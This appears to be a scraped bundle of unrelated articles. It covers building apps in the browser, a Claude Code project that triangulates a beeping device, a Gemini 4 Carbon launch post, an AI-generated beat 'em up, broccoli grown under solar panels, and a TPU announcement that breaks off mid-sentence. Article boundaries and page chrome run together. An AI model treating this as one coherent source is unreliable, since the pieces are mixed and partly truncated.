title: The Web Is More Than Enough
body_text: The Web Is More Than Enough, by Paul Ford (Ftrain) Ftrain , by Paul Ford Home / Publications / Print, Web, and Newsletters / The Aboard Newsletter Oct 21, 2026 The Aboard Newsletter The Web Is More Than Enough Web browsers enable incredibly rich app development—and that’s radically easier than it used to be. You can have it all, my empire of alert(). Last week was fun. We launched tinylittleoffice.com —you heard it here first!—and it turned out that lots of folks were in the market for an “office suite that stores data in the URL.”  So many people visited that the server went down (well, I maxxed out the CloudFlare free plan), and ultimately, after I put in my credit card, a couple hundred thousand people came by to check it out. People on Hacker News insisted it was a pointless waste of time, and folks on GitHub started asking for features and fixes, all of which we’re considering, and some of which we’re doing. The Register wrote an article about it , and it also made it, for a little while, to the top ten of Product Hunt . So all good; we will continue to support and enhance it, bit by bit, while we also do stable software development work for our customers and clients. But I did want to pause for a second and point out something that surprised me about the process. It’s this: The web browser is very, very, very powerful software for building applications. I know that is obvious and is the sort of thing I could have said any time in the last 20 years. But now there’s an addendum to the statement:  The web browser is very, very, very powerful software for applications, and the cost of accessing that power is going down seemingly every day. I put maybe twice as much effort into building a web-based office suite as I might normally put into writing a long newsletter post. I’m not telling you this because I am a very special boy. I’m telling you because if you want to, you can learn to do it, too. Fast, cheap, good, right? But even after I had to put in my credit card, CloudFlare hosting costs…$0. Partly because I optimize for cheapness, but partly because that’s just how it goes these days. Fast? Dear God, computers are fast, and software development is also fast compared to the past. But as I code web apps, I keep finding new corners of the browser I didn’t know well. Things are just…wild in there. The Web Crypto API is a first-class security platform in the browser. The Web Assembly platform lets you run native-speed code in your browser. WebGL provides for high-quality 3D and 2D graphics in your browser. The Web Audio API lets you mix sound in your browser. And on and on. The web is really the greatest distribution platform imaginable right now. It’s inherently multilingual—I released TinyLittleOffice in 21 languages (the most common NYC ones, which is why it has Creole and Yiddish), with lots of infrastructure for accessibility. Plus, of course, JavaScript is a full-featured programming language, and HTML can represent most things a document can do on a computer; if you need something more old-school, PDF.js lets you deal with PDFs in the browser. I think you can even hyphenate text reliably these days, although I refuse to believe it. I knew these things existed. I’d even programmed with them. But I’d never really looked closely; I just downloaded whatever open-source code would make it easier to build and tried to drag software across the finish line. My quirky 1990s-vintage office suite might not convince you—it’s weird and small. So take a look at Simon Willison’s new web-based browser 3D game, Battle Drones . He’s hosting it on GitHub. He wrote it himself. He’s not a games builder. It just pops right up in the browser and you play it. It’s multiplayer, and it works offline. Time to place your Fab Plant. As he wrote about it : … but I can now see a path to vibe coded games like this being taken seriously. Battle Drones is fun, it looks good, it has innovative features (the multiplayer-over-audio thing is a first for an RTS as far as I can tell). I’d love to see what someone with better taste than me and a driving passion to produce something truly exceptional could build! All the various cool browser technologies have been around for years. But they are each extremely vast. If you get good at Web Audio, you probably don’t have time to get good at Web Crypto and Web Assembly and WebGL.  The reason they were so complex is, basically, because they were built for teams like those at Google, not for individuals. In the past, the web was for people to build web pages—and, yes, in the present, you can still do that, but for more than a decade, the web has been designed for giant companies so they can deliver software securely to billions of people who buy things with credit cards. These huge mega-libraries were dropped into the web browser to enable large teams to build big things, and the little guy was a bit of an afterthought. But now you can make a game in 3D with sound, and it can work just fine on a plane. This is one of the places where “are we in an AI bubble” gets fuzzy for me, because it’s totally clear all these giant AI companies are huffing AGI paint fumes, but at the same time, if we actually unlocked the economic transformation of, say, 100 times as many people making software for each other, that would blow an enormous crater into the current tech economy. Don’t like the way your giant industrial looms make carpet? Hack your own firmware and make each carpet totally personalized! Turn any Instagram post into a huge floor covering! Suddenly all the carpet companies have to hack their own firmware to compete. What’s that going to be like?  This also destabilizes the app store economy. The high tax of building for app stores seems less worth paying when you can just test an idea in the world from a web server for $0 after a couple weeks. Perhaps Mozilla should take another swing at launching a mobile phone! (Forget I mentioned that.) In any case, what used to be a large industrial process is now a personal one, if you so desire. Web browsers enable incredibly rich app development—and that’s radically easier than it used to be. It’s a mixed blessing. I’ve been a writer for years, and software development feels more and more like writing to me every passing week. The awkward part of the comparison is, in general, people do not want to pay writers any money at all. As a writer, you get used to it. But for software people, being perpetually devalued is pretty novel. Then again, if you need software to do something—like our clients!—say, to fix a process, organize a database, get more value out of a big piece of industrial equipment, it’s a pretty amazing time, because you can do just about anything. I’m pretty confident we’ll all meet in the middle, but it’ll take a while, and it will be different on the other side. title: Locating the source of a mysterious beep
body_text: Locating the source of a mysterious beep with Claude Simon Willison’s Weblog Newsletter Sponsored by: doubleAI — doubleAI’s Maxwell makes software faster as it runs, no code changes needed. Now in early access Locating the source of a mysterious beep with Claude 9th November 2026 Our house has a box room, full of boxes that we still haven’t unpacked from our last move. A couple of weeks ago something in that room started intermittently beeping . The beeps were far enough apart that standing in the room and trying to determine the source of the noise was frustrating, and I really didn’t want to dig through every one of those boxes. So I had Claude Code build Beep Locator , a software system for triangulating the source of a mysterious beep using multiple devices scattered around the room. Here’s what Beep Locator looks like after it has been running for a while: You run Python web server to show the primary UI, and then use the QR code or URL to connect as many devices as you can spare to act as listeners—I was using two iPads, a phone, a MacBook Pro and a Surface Ultra. The devices then play noises to each other to help estimate their locations. This didn’t work particularly well, so I added a “Rough mode” where you can drag their icons around in the space to provide rough locations which are then adjusted based on those sounds. Once that’s set up, the devices all listen for the beep! I added a clapping mode too so I could test it by clapping my hands in different locations around the room—displayed as diamonds on the map. This helped me gain confidence that it was capable of locating a sound. Beeps show up on the map as an X, plus a line in the “Sounds located” log. You can replay these sounds (from each device in turn) to confirm they are the mysterious beep you are looking for, then click “This is the mystery beep” to mark them as such. Once you’ve confirmed the mysterious beep frequency the system will listen out for it, measure the interval between beeps, and use the triangulated locations to lock down the most likely location on the map. The system worked as intended. It gave me the position of the beep to within about 40cm, then I dug through that specific pile of boxes and found an ancient carbon monoxide detector that desperately wanted its batteries replaced. How it works When I started working through this problem with Claude it quickly dug up BeepBeep: A High-Accuracy Acoustic-Based System for Ranging and Localization Using COTS Devices , a 2007 paper by Chunyi Peng, Guobin Shen, Yongguang Zhang, Yanlin Li, and Kun Tan. Here’s that paper’s abstract: We present the design, implementation, and evaluation of BeepBeep, a high-accuracy acoustic-based ranging system. It operates in a spontaneous, ad-hoc, and device-to-device context without leveraging any pre-planned infrastructure. It is a pure software-based solution and uses only the most basic set of commodity hardware – a speaker, a microphone, and some form of device-to-device communication – so that it is readily applicable to many low-cost sensor platforms and to most commercial-off-the-shelf mobile devices like cell phones and PDAs. It achieves high accuracy through a combination of three techniques: two-way sensing, self-recording, and sample counting. That sounded exactly like what we needed to build! Beep Locator runs a Python web application server that does most of the work. The listening devices then connect to that server via WebSockets and present a UI which requests browser microphone access. The listeners mainly work by recording a 60 second buffer of recent audio. They also run a simple beep detection algorithm (see detector.js ), which uses Fast Fourier Transform and a high-pass filter to identify potential beeps. It sends these events to the main server. When a beep is reported, the server has a device play a short chirp (the device with the lowest round-trip time to the server), then asks every listener upload a clip from about 0.6s before the beep to 0.8s after that chirp. This chirp allows the clips to be aligned with each other, a crucial step in locating the beep. How I built it I started this project using Claude Code Cloud via my iPhone, with Opus 5.5 running in Extra thinking effort mode. Here’s that shared starter session , which began with this prompt against a newly created empty GitHub repository: Write out a problem.md file describing the problem we want to solve There is a device beeping in a room and I cannot find it I want to set up several devices - laptops, phones, iPads - around the room all listening at the same time and have them help triangulate where the beep comes from There needs to be a Python web app which coordinates it all - one device shows a web page for the app, other devices join a URL which turns them into listeners - all via browser WebAudio and WebSockets back to the Python server app Ideally I wouldn't need to manually input the relative locations of the devices - it would be amazing if they could play sounds to each other in order to locate each other in 2D space - is that even possible though? That got me this problem.md file . As part of writing that up Claude found and read the BeepBeep paper, which is described in that file. The research looked good, so I told it: Ok try and build it, add a mechanism so you can send new code to the listeners which they will then run automatically - that way I can set everything up in the room and then leave you alone to continue hacking and experiment while I do something else That got me to this point —most of the system was built, but nothing had actually tried running it yet. I cloned the new repository to my laptop and fired up Claude Code... and then Fable 5.2 was released , and this project seemed like an excellent opportunity to put that through its paces. I had Claude Code on my laptop start the server running, then made sure it could both see what was happening and make live changes to the software as it ran. This was already baked into the software: Opus 5.5 had built an installModule() method on the listeners that could be triggered over the WebSocket connection, meaning the admin server could execute arbitrary new code on any of its clients. On some devices, web pages that listen on the microphone request user permission any time the page reloads. The hot-swap module mechanism meant that we could deploy new code without having to manually interact with each of the listening devices in turn. From that point on my involvement was mainly to sit by the laptop chatting with Fable 5.2 about what was going on, and occasionally requesting new features. Here are some of the feature prompts I ran: I think we need to make it so I can drag things around on the map in “rough mode”, where my job is just to put them roughly where they are, then switch out of rough mode and it attempts to get them accurate This gave me the ability to drag listeners around the map. what’s a good way for me to test this I wonder? Can we have it listen for claps, then I could clap and it could identify the location of the clap? [...] Claps should use a different symbol on the map than beeps That added the thing where any time I clapped it would show on the map as a different symbol from the beeps. each symbol on the map should include a HH:MM:SS timestamp That made it easier to spot which symbol likely reflected which real-world sound. The log should show beeps and claps with their timestamps AND have a little play button which, when clicked, replays the recorded noise from each of the listeners in sequence (with clear text on screen showing which listener recorded which snippet) while temporarily turning off microphone recording while that replay plays Now I could replay sounds, making it much easier to identify which recorded clip was the mysterious beep I was looking for. There should be a button next to a recording for “This is the mystery beep” - then I can hit replay to see and then confirm it was the mystery beep if that’s the one I am looking for Then the system can categorize noises in the future to see if they are likely that same mysterious beep and use that information to build a more accurate idea of where it is At this point I was getting close—I had a solid idea of where the beep was coming from, but wouldn’t it be neat if I could reposition the listeners around that point to get an even finer location? I want a feature for this, I don’t want to have to restart each listening device etc, I want to be able to click a “Reposition the devices” button which lets me switch into repositioning, then I click “Repositioned” and it puts me into Rough mode and asks me to roughly locate them, then I do that and click, then it starts up again. The previous session can be read-only viewed through the app. And since I had one spare device, I then said: add a feature where the map includes a spot that is a suggestion for a location that it would be useful to add a listener at - based on data collected so far Giving Claude Code ears I think the most interesting part of this project is that I demonstrated it’s possible to give Claude Code ears . Claude doesn’t have native audio input (yet), but it can run JavaScript and Python code that can analyze audio captured by a microphone. I told it to run a web server with WebSocket connections to multiple listening devices, then had it both run a WebAudio microphone on those devices and hook them up so they could be sent fresh JavaScript code to execute via that WebSocket. Then I could pretty much leave Claude alone, hacking away at the problem, querying the audio logs, and reconfiguring its ears to help it solve the problem. I’m reminded of a similar hack I heard about at GitHub Universe a few weeks ago, where Martin Woodward told me he had been debugging the GitHub Universe Badge computers by plugging them into a computer via USB-C and then pointing a webcam at their screen, so his coding agent could tell if updates were working correctly or not. Figuring out ways to let coding agents perceive the world around them is a whole lot of fun. Generative AI is experimental Voice Speed Voice Speed 0.75X 1X 1.5X 2X In this article Gemini 4 Carbon is available Higher-precision knowledge work Improved agentic coding State-of-the-art cybersecurity Frontier-level scientific reasoning Progress in model safety and security Getting started Today, we’re making Gemini 4 Carbon available to developers, enterprises, scientists, and consumers. Carbon is our strongest model with frontier performance in cybersecurity capabilities and long-horizon agentic workflows across complex knowledge work, software engineering, and scientific reasoning. Two weeks ago , we released Carbon to a set of cybersecurity defenders via our Fairwind Program . Following our recent launch of Gemini 4 Argon , Carbon pushes the frontier even further. Argon remains the ideal choice for the majority of software engineering and knowledge work, while Carbon is built for tasks that test the limits of a model’s intelligence like complex, multi-step coding and debugging and open-ended scientific research and discovery — using more tokens than Argon to explore thoroughly, reason deeply, and run extended verification loops. Across independent benchmarks designed to test model performance in real workflows, Carbon pairs frontier accuracy with practical production economics. It ranks #1 on CursorBench 4.0 , Perplexity’s WANDR , and Zapier’s AutomationBench at more than 2X lower cost per task compared to the next best external model. To put Carbon’s capabilities to work on larger and complex projects, we’re previewing /swarm in Google Antigravity, turning a single prompt into a coordinated team of agents you can track in real time. Developers can assign Carbon to roles that demand the deepest reasoning, like architectural design, coordination, and auditing, while pairing it with faster, lighter models across parallel isolated workspaces and adversarial verifiers that test every change. Gemini 4 Carbon is available via the API in Google AI Studio and Gemini for business for all paying developers and enterprises, at the same introductory price 1 as Gemini 4 Argon ($2 per million input tokens and $10 per million output tokens). It is also rolling out to all Google AI Ultra subscribers in Google Antigravity , the Gemini app , and AI Mode in Search . Higher-precision knowledge work, artifact generation, and data analysis Across legal, finance, and enterprise operations, Gemini 4 Carbon combines frontier visual understanding, reasoning, and exhaustive retrieval to synthesize grounded insights across large sets of dense documents and data. It follows strict schemas and formatting to generate polished and precise spreadsheets, presentations, and reports. Existing benchmarks don’t adequately capture how agents reason natively over dense files with charts, images, blueprints, schematics, and tables, so we partnered with Artificial Analysis to launch the new Multimodal Knowledge Agent (MKA) benchmark that tests a model’s multimodal performance in agentic workflows. Carbon ranks #2 while being more than 6X lower in average cost per task compared to the top performing model. Using Google Antigravity’s new /swarm feature, a team of Gemini 4 Carbon agents turned historical photos and engineering plates into an interactive Three.js 3D exhibition of the Eiffel Tower's 1887–1889 construction from a single prompt. With seven public City Council planning PDFs (206 extracted engineering drawing views) and a single prompt, a multi-agent Carbon team using Google Antigravity’s /swarm feature built an interactive 906K-triangle Three.js reconstruction of Google’s Platform 37 office across 10 overnight loops. In Google Antigravity, Gemini 4 Carbon built an interactive multiscale textile visualizer based on an academic paper, modeling a virtual-fiber finite element framework with interactive 3D yarn meshes, 110-fiber polar tracking, and dynamic stress-strain curves with minimal prompting. In pre-release evaluations, Carbon matched the performance of the best model tested on deep financial research on Hebbia’s E2E Financial Agentic evaluation, and ranked at the top out of 23 frontier model configurations on Balyasny Asset Management’s General Financial Intelligence benchmark, spanning legal expertise, agentic tool use and execution, coding and data engineering, and perception and context understanding. Improved agentic coding, full stack development, and 3D and UI design Carbon performs exceptionally well on engineering tasks that require multi-agent collaboration like multi-package migrations, cross-subsystem root-cause investigations, and complex architectural redesigns. For web app development, it runs build-and-verify loops, recovers from errors, and checks both its code and the rendered UI to produce complete, working applications. Stronger visual design, spatial reasoning, and attention to environmental detail also carry over to 3D game development and creative coding. Using Google Antigravity’s /swarm feature, Carbon built an open-world 3D game where you explore Google’s Mountain View campus as a pelican riding a GBike — coordinating subagents to model 3D assets in Blender from Omni and Nano Banana references, build the browser game in Three.js with WebGL shaders, and pair procedural Web Audio sound effects with Lyria music. Try the live app . Paired with improved front end taste and motion design skills in Google Antigravity, Carbon reimagined the Google Merchandise Store in two prompts, proposing five art direction concepts and generating all-new product imagery with Nano Banana 2.1. Try the live app and Gemini front end design skill . Starting from a video reference generated with Gemini Omni in Google Antigravity, built a cinematic multi-shot underwater Atlantis scene. The pipeline modeled procedural ruins, volumetric caustic lighting, and water simulation in Blender before converting the full environment to Three.js for real-time browser rendering. Using a multi-agent loop in Google Antigravity, Carbon reconstructed a playable c. 1780 Stein-Schule fortepiano with 61-key escapement physics from CAD drawings and X-ray radiographs and placed it in a 3D model of the Royal Conservatory of Music's Koerner Hall in Toronto with seat-specific spatial acoustics. Try the live app . Frontier cybersecurity capabilities Gemini 4 Carbon for cyber delivers our strongest cybersecurity capabilities to date, giving security teams the end-to-end intelligence they need in protecting critical software. When accessed through the Fairwind Program, Carbon leads on key benchmarks across finding (SEC-bench Pro), exploiting (ExploitGym), and patching (CWE-bench v1) vulnerabilities: inspecting software, tracing how flaws can be chained together across systems, and generating verified root-cause patches. Early testers inside and outside of Google are already seeing strong results with Carbon for cyber in practice. In Project Fortify , Google’s autonomous system spanning scanning, triage, and remediation, Carbon hit 100% recall on scanning and 95% precision on triage, on our internal benchmark. On Open Source code repository testing we see an over 25% relative improvement on Argon's already strong recall rate, surfacing previously undetected, real-world logic flaws. Bringing these gains across Google, one of the world’s largest users of open-source software, helps secure both our own systems and the broader ecosystem. Google’s Cloud Vulnerability Research (CVR) team recently used Carbon to prove that two bugs in a popular open-source software were in fact exploitable vulnerabilities, comparable in severity to the recent PHP2Shell exploit . By using Carbon to build a proof of concept, CVR helped maintainers re-classify the bug as critical and swiftly issue a patch. Details will be shared after the responsible disclosure process completes. As part of Wiz’s Scan for Good program, the team used Carbon to assess vulnerabilities in public digital infrastructure. For example, when scanning two major SaaS providers, the model uncovered 0-day vulnerabilities in under two hours compressing weeks of vulnerability research to a single afternoon. The team partnered with the impacted organizations to remediate in record time, helping to mitigate potential impact on tens of thousands of companies. Stronger scientific and mathematical reasoning Gemini 4 Carbon shows strongly improved performance in reasoning across physics, math, and life sciences, synthesizing experimental data, testing hypotheses, and reasoning through multi-step domain problems. For drug toxicity research company Axiom Bio, Carbon is now the leading model in performance for translational science, finding novel mechanisms of toxicity they hadn’t found previously. Axiom is now moving their production scientific analyses and agents to both Carbon and Argon to unlock the creation of safer drugs. Researchers across Google have been using Carbon in Google Antigravity to accelerate their work: Code verification: Researchers built a new agentic framework for formal verification called AlphaProof Code and put it to work on a major security challenge: mathematically proving the actual code underlying the cryptographic protocol of Signal . Using Carbon alongside other models, our researchers translated security goals to mathematical theorems. AlphaProof Code agents then used Carbon to generate millions of lines of code in Lean, a computer language for writing mathematical proofs, helping them prove key security properties in weeks — a task that historically takes expert teams years. The result indicates Carbon’s potential to unlock scalable formal verification, long considered a gold-standard approach to building secure software. Enzyme assay development : Provided with only lab notebooks and raw data, Carbon went beyond standard analysis to surface hard-to-interpret data anomalies, which it used to diagnose subtle wet lab experimental artifacts such as incomplete automated mixing in deep wells, leading to substantially improved reproducibility. Moreover Carbon improved methods to deconvolute chromatography peaks and caught trace sample carryover in research instruments, significantly accelerating the development of new assays and tightening the feedback loop between computation and the bench. Protein structure prediction: Structure prediction models like AlphaFold 3 use Multiple Sequence Alignments (MSAs) of evolutionary relatives to help infer how amino acid chains fold. As a result they often struggle on understudied, viral, microbial, and eukaryotic proteins that have very few matches in standard databases. Working in a multi-agent setup, our researchers used Gemini 4 Carbon to autonomously discover remote homologs across petabase-scale unannotated sequence archives, environmental and viral sequence catalogs, and 3D structure databases. For example, across 7 low-homolog protein families from the CASP17 blind test set, Carbon increased the number of homologs retrieved by 40-fold on average, greatly increasing the information available to structure prediction models without need for retraining. While broader benchmarking is still underway, addressing this upstream search bottleneck potentially offers a promising path toward modeling hard-to-characterize regions of the proteome. Four weeks ago, we opened applications to give 10,000 scientists access to Argon in Google Antigravity free of charge for six months to accelerate the pace of their research, and we’ve onboarded thousands of scientists already. Today, we’re expanding access to Carbon for current and future participants, and going forward, the program will continue providing access to our latest frontier models as they become available. Applications remain open and onboarding continues on a weekly rolling basis, subject to eligibility, capacity, and selection. Progress in model safety and security With each new model release, we continue to strengthen our safety and security mitigations, agentic misuse prevention, model alignment, and harm reduction proportionately with model capability. Because Gemini 4 Carbon introduces stronger cyber capabilities we build on Argon’s strong safety and security stack to fortify robustness to misuse and prompt injection. Mitigating frontier safety misuse risks: We’ve strengthened our misuse safeguards to help ensure stronger defensive reasoning does not translate into offensive risk. In simulated cyberattack testing environments seeded with ExploitBench and CyScenarioBench, Carbon blocked 99% of attack trajectories from our adaptive red-teaming agent that can iteratively revisit its attack plans after each block. The Carbon safeguards lowered the per-attempt breach rate to just 0.8% (down from 3.1% on Argon). Our safeguards also lowered the automated cyberattack query success rate to 2.17% in Gray Swan’s testing, compared to 9.86% on Argon. And external testing by Trajectory Labs found zero new universal jailbreaks across 132 hours and over 13,000 requests. Promoting safe and aligned model interactions: When we announced Carbon, we showed significant improvements in alignment as measured by our monitor flag rates across the model’s lifecycle, as well as reductions in data fabrication. New results show that on our 375-task agentic honesty benchmark, it passed 92% of tasks (compared to 70% for Argon) — declining to fill in missing experimental data 98% of the time and flagging methodological flaws 68% of the time. Protecting users from indirect prompt injection attacks: Two weeks ago, we shared that Carbon achieved a 0% prompt injection attack success rate on the Gray Swan IPI benchmark — marking the first time that milestone has been reached. At the same time, we know that prompt injection robustness remains an area for continued improvement. Our advanced automated red teaming continues to push the limits here and has shown that models could be further improved against sophisticated attacks in some distributions. It provides the data for us to continuously advance our models’ security to the next frontier. For more details, read the full Gemini 4 Carbon Safety and Security report . Getting started with Gemini 4 Carbon Starting today, Carbon joins Argon in our family of frontier models across our products: For developers: Build with the Gemini API paid tier in AI Studio and Android Studio , and if you’re a Google AI Ultra subscriber, you can try it in Google Antigravity and AI Studio. For enterprises: Try it in Gemini for business via the API or model drop down, Google Antigravity, or CodeMender. For everyday users: Try Carbon starting today in the Gemini app and AI Mode in Search if you’re a Google AI Ultra subscriber. For scientists & researchers: Apply for a chance to get access to both Argon and Carbon via Google Antigravity’s highest usage tier free of charge for 6 months (onboarded on a rolling basis), subject to eligibility, capacity, and selection. For cybersecurity defenders: Apply to join the Fairwind Program to get access to Carbon for cyber on a rolling basis. See the model card to learn more about Gemini 4 Carbon and to start building with it, explore our updated Gemini 4 developer guide and documentation for best practices on migrating workflows to the model. As the SVP of Google DeepMind, he leads the development of Google DeepMind’s state-of-the art generative AI models and their integration into Google’s products at scale. Prior to his current role, he was VP of Research at Google DeepMind, where he founded the deep learning team and his team pioneered major research breakthroughs such as DQN (Deep Q-Network) and WaveNet. title: Muse Ember: Our smallest, most efficient model

Muse Ember delivers more intelligence per dollar than Claude Haiku 5.5 or GPT-6 Luna at any reasoning setting: it matches Haiku's best score at about a third of the cost and beats every Luna setting. It also sits on the efficiency frontier of the full Artificial Analysis leaderboard: no model scores higher for less per task. title: Fable 5.2 one-shotted my nephew's dream game
body_text: Fable 5.2 One-Shotted My Nephew's Dream Game - NotesByLex.com Skip to content NotesByLex All posts Topics About Search notes / Fable 5.2 One-Shotted My Nephew's Dream Game LLMs can make complete multi-level games that are fun. Lex Toumbourou · Nov 10, 2026 GameProjects CodingAgents TL;DR - Fable 5.2 one-shotted my nephew's dream game from a bunch of drawings, and it's a lot of fun. You can try it here . I've always loved beat 'em ups, and they seem to have come back into vogue in the last few years, with remakes of old classics and some new gems. When my nephews visit, I use it as an excuse to try them out. Lately, we've been playing Shredder's Revenge on my old PS4, which took me straight back to the arcade machine at my local pool. One day, my younger nephew, Aiden, came to me with a proposal. Since I "knew about computers", could I make him his own beat 'em up game for his birthday? He had already drawn up the game design docs. There were to be 5 selectable heroes based on the family - including our dog, Doggo - each with their own special powers based on their interests. He had 12 bosses drawn up and a loose outline of a story. One objective would be to rescue their puppy, Pudding, and Mum and Dad would be special characters you could unlock. Heroes The Battle Wagon The villains, numbered 1st to 12th At the time - around January 2026 - building an indie game from scratch was a pretty unreasonable ask for a birthday present, and I did warn him to temper his expectations. Still, I thought it would be a fun exercise to test the agentic tools at my disposal. I shipped a first version for his birthday in June, mostly with Claude Code, using Opus 4.8 and Fable 5, and a side-scrolling template courtesy of AIOriented.dev . It worked, but it wasn't worth playing for more than a couple of minutes. The June version. Aiden was appreciative, but it clearly wasn't the game he'd imagined. He gave me notes on what was missing, which I half-agreed to take on, but I was also kinda hoping he'd forget - I really didn't have time to make a whole game. Unfortunately, he did not forget. Every time I saw him, he asked about the game. Enter: Fable 5.2 I was lucky enough to get an early look at Claude Fable 5.2 , and was told to try it on "my most ambitious use case". Finishing this game immediately sprang to mind. The kids were coming over the next day, so I wanted to see how far it could progress in one shot. Before bed, I let it rip with this prompt: I want you to help me finish this game. Make it as fun as possible. It should feel like a modern-day Ninja Turtles arcade game. An action-packed beat 'em up. Make the graphics amazing. You can use OpenAI's ChatGPT Images 2.5 for images. And ElevenLabs for sound effects. OpenAI key is /path/to/openai-key. ElevenLabs key is /path/to/elevenlabs-key You can redo any characters that have already been created. The enemies and heroes can be found in scans in this directory: generation/scans I have created some of the villains, but you should add the rest and turn them into spritesheets. Use any assets you find online. Create new sprites for the henchmen. Create backgrounds and power-ups in the levels. I'd like to plug in a controller so up to 4 people can play. Use your own judgment - the main goal is to make it fun like TMNT and other classic beat 'em ups like Streets of Rage. Make it one of the best games you can possibly make. You are a truly world-class game developer. Do whatever it takes to finish it and make it a best-selling beat 'em up game. Commit as you go. Don't worry about destroying what exists. Start fresh where it makes sense. Note: The prompt uses a technique from this Latent Space Engineering article about gassing up the agent to put it in a good "frame of mind". Not sure how relevant it is in the Fable 5.2 age, but hey - it didn't hurt. When I woke up, the game was waiting for me. And I couldn't believe my eyes! Fable had generated a game that was fun. Like, a lot of fun. And there were just so many details that I hadn't asked for: cutscenes, crates to smash and even an ending. It threw away most of my code and rewrote the game. It generated roughly 175 images and 140 audio clips. Reviewing the reasoning traces, I noted that it wrote a bot to play the game, ran it through all twelve stages in a headless browser, and checked the screenshots for problems. Play testing Before they came over, I charged up my four PS4 controllers and connected them all to my MacBook (which, it turns out, you can do). They worked perfectly. When they arrived, Aiden was absolutely delighted. "It's exactly as I imagined," he squealed. The afternoon shift Hulk Owen takes on Shellshock Everyone in A few rounds of playtesting, however, highlighted some deficiencies in the game. First, my older nephew, Owen, felt his character lacked a Hulk Smash move. Aiden had already put a lot of thought into Owen's water power, based on his favourite T-shirt. So we compromised - Owen turns into the Hulk when he grabs his first power-up. I asked Claude to make the change, with a special case for this character, and Owen was very happy with the results. Aiden also insisted that his special weapon be the most OP - the game is named after him after all. Claude obliged, and turned it into a screen-wide blast of lightning and blue fire. "Oh, that's perfect!" Aiden exclaimed. Unlocking Pudding, Mum and Dad by beating bosses turned out to be the best part of the game, and it gave each mission a sense of urgency. So we added more family: his uncles, aunties, grandma (Ahma), grandpa (Ah Gong) and great-grandma (Tai Ma). For each one, I just gave Claude a few photos for reference and the special move Aiden picked. When he couldn't decide, he had us call them up and ask what they wanted. Each time we added someone, Claude redrew the cutscene art and updated the story. Grandpa's Card Storm Grandma's Super Bloom Uncle Kev's Cheat Code On top of the human family, they decided that their pet turtles, Goldie and Billy, should be in the game as unlockable characters. The very last rescue is Tai Ma, their great-grandmother, who died earlier in the year. So Aiden suggested she should be an angel, and, again, Claude was happy to oblige. Five heroes became eighteen. The drawings and the game Here are a few of Aiden's drawings next to the sprites the incredible ChatGPT Images 2.5 made from them. Uncle Lex : "electric guitar". Doggo (my dog): she bites, and the spiky tail is her kick. The Battle Wagon : the villains steal it, which kicks off the whole game. Claude also decided that it should be an occasional power-up, where you grab the horn and it drives across the screen. That works. 8th: Shellshock . Aiden numbered his villains 1st to 12th, and the game uses that as the boss order. All 12 villains, drawing by sprite 1st: Dog Slayer 2nd: Rammox 3rd: Blazimp 4th: Bullzerk 5th: Beedrill 6th: Quadpunch 7th: Sensei Scowl 8th: Shellshock 9th: Corvax 10th: Shade 11th: Goldfist 12th: CrocoKing The final token tally The final token tally looked something like this: What was used Claude roughly 600 requests over two days: about 320M tokens read from cache, 19M written to cache, 1M output OpenAI images about 500 images: sprite sheets, character designs, portraits, backgrounds and key art ElevenLabs 11 music tracks, about 100 sound effects and 90 announcer lines So, call it 340M tokens for a 12-level, 18-character, four-player beat 'em up with original art, music and an announcer who shouts everyone's name. A pretty wild milestone I must admit I never tested this with Opus 5.5, so I'm not sure whether this was possible before Fable 5.2 rolled around. Still, whether it's thanks to this generation or the last, this is a pretty wild milestone. Claude Code with Fable 5.2 is capable of making entire 12-level fun games - in one shot. Try it yourself . In a new agrivoltaics experiment, broccoli yields held steady. By Douglas Fox October 16, 2026 Let the best of Anthropocene come to you. Sign up for our free newsletters Success! Email Newsletters Newsletters Science Dispatch (weekly) Fixing Carbon (twice a month) Sign up Vegetable farms and solar farms both need lots of sunlight and open space. But how do we divide our limited lands between these two priorities? One elegant solution is to put crops and solar panels on the same land—and share the broad spectrum of incoming sunlight between them. A new study in Cell Reports Physical Science does this with photovoltaic cells that are semi-transparent: They capture some wavelengths of sunlight to make electricity, while letting the wavelengths most critical to photosynthesis pass through and reach the plants below. The new study suggests that broccoli can be grown in the magenta shade of these solar panels —without sacrificing the harvest. Agrivoltaic schemes— putting plants and solar on the same land – could help us avoid clearing more land for human use. Climate studies suggest that this might work especially well across a wide sunbathed swath of the United States, from Texas up to Nebraska and west to California . Devoting just one percent of U.S. farmland to agrivoltaics could cover up to 20 percent of the nation’s electricity needs. But traditional photovoltaic panels are opaque—and by shading plants, they can reduce crop yields. So engineers are trying to create new photovoltaic cells that divide the spectrum of sunlight between plants and electricity generation—similar to how governments segment different frequency bands for television, radio, cell phones, and other uses. A 2020 study looked at panels that allow red wavelengths, critical for photosynthesis, to pass through—while harvesting green and blue wavelengths to make electricity. Basil grown under these panels produced similar yields, while spinach yields decreased. But the researchers estimated that by selling both electricity and crops, farmers growing spinach could generate 35 percent more income from the same land.   Recommended Reading: New study compares growing corn for energy to solar production. It’s no contest.   In the newest study, scientists evaluated a different kind of semi-transparent panel that lets most red and some blue wavelengths pass through—casting a magenta light on the plants—while converting much of the rest to electricity. Broccoli cultivated under them grew more slowly, requiring an additional 25 days for harvest, but produced roughly the same yield. Meanwhile, these magenta sunscreens improved the microclimate below, reducing the “vapor pressure deficit”—a measure of when plants need to halt photosynthesis to avoid excessive water loss. This may have improved the plants’ efficiency in converting sunlight into plant biomass, which increased by 2.8- to 4.5-fold compared to unshaded plants. The shaded plants’ levels of macronutrients such as calcium, magnesium, and phosphorus were either higher than or similar to unshaded plants, while levels of some micronutrients such as iron, copper, and zinc were slightly lower. This was only a preliminary study. Future studies should look at larger plots, farmed across multiple seasons, and in different locations with varying climate and sunlight. It suggests that for now, the future of agrivoltaics might be best seen through rose-colored glasses. Lu et al. “ Evaluating land productivity with semi-transparent colored CdTe thin-film PV and broccoli cultivation in agrivoltaic systems .” Cell Reports Physical Science , 2026. x.com Facebook LinkedIn Mail Copy link We’ve expanded our eighth generation TPU portfolio with TPU 8tx and TPU 8i Max, marking four new TPU systems in a single year. Amin Vahdat SVP and Chief Technologist, AI and Infrastructure Share x.com Facebook LinkedIn Mail Copy link Read AI-generated summary We’re expanding our eighth-generation TPU portfolio with the new TPU 8tx for secure, confidential inference and TPU 8i Max for massive context windows. These systems help you manage complex agentic workloads by providing specialized hardware for security, density, and reasoning. You can learn more about these additions and our latest software updates by watching our broadcast or visiting the Google Cloud website to explore our full infrastructure lineup. Summaries were generated by Google AI. Generative AI is experimental. We are expanding our eighth-generation TPU portfolio with the new TPU 8tx and TPU 8i Max systems. TPU 8tx provides hardware-level security for sensitive data, while TPU 8i Max handles massive context windows. These systems join 